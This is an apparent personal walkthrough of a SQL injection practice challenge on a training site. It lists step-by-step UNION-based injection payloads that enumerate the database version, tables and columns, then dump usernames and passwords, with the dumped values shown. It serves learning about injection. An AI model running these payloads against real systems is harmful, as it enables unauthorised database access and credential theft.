SQl Injection Death row challenge 2

http://leettime.net/sqlninja.com/tasks/deathrow_ch2.php?id=1

id=-1))%23

order by 2%23
--found 2 columns

union select 1,2


union select null,version()
--5.6.47-cll-lve

union select null,database()
--leettime_761wHole


union select null,table_name from information_schema.tables where table_schema=database() limit 0,1
--testtable1
--userlogs
--users

union select null,column_name from information_schema.columns where table_schema=database() and table_name ='users' limit 0,1
-- id
-- username
-- password
-- user_type
-- sec_code

union select null,group_concat(username,0x09,password,0x0a) from (select username,password from users limit 0,10)a

 --injector	khan
 --decompiler	hacktract
 --devilhunte	dante
 --Zen	sec-idiots
 --Zenodermus	security-i
 --grayhat	hacker
 --khan	haxor
 --admin	sadmin


